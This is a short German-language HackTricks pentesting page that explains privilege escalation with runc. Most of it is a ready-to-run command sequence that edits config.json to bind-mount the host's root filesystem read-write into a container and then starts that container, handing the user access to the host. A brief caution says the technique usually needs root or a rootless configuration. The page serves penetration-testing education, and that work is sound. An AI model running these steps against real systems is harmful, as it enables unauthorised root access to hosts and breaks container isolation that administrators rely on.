# RunC Privilegieneskalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn Sie mehr über **runc** erfahren möchten, besuchen Sie die folgende Seite:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Wenn Sie feststellen, dass `runc` auf dem Host installiert ist, können Sie möglicherweise **einen Container ausführen, der das Root-/Verzeichnis des Hosts einbindet**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Dies wird nicht immer funktionieren, da die Standardoperation von runc darin besteht, als root zu laufen, sodass das Ausführen als unprivilegierter Benutzer einfach nicht funktionieren kann (es sei denn, Sie haben eine rootlose Konfiguration). Eine rootlose Konfiguration zur Standardkonfiguration zu machen, ist im Allgemeinen keine gute Idee, da es in rootlosen Containern einige Einschränkungen gibt, die außerhalb rootloser Container nicht gelten.

{{#include ../../banners/hacktricks-training.md}}
